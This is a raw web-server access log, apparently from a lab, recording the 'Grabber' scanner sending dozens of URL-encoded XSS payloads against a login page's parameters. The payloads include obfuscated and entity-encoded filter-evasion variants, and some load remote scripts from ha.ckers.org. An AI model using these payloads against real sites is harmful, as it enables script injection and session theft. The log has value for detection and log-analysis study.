172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&user_token=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&Login=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&password=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E&user_token=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E&Login=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E&password=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&user_token=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&Login=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&password=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&user_token=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&Login=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&password=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=See+Below&user_token=See+Below&Login=See+Below&password=See+Below& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=See+Below&user_token=See+Below&Login=See+Below&password=See+Below& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E&user_token=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E&Login=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E&password=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C&user_token=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C&Login=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C&password=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E&user_token=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E&Login=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E&password=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E&user_token=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E&Login=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E&password=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D&user_token=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D&Login=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D&password=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /?username=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&user_token=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&Login=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&password=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:59 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&user_token=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&Login=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&password=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
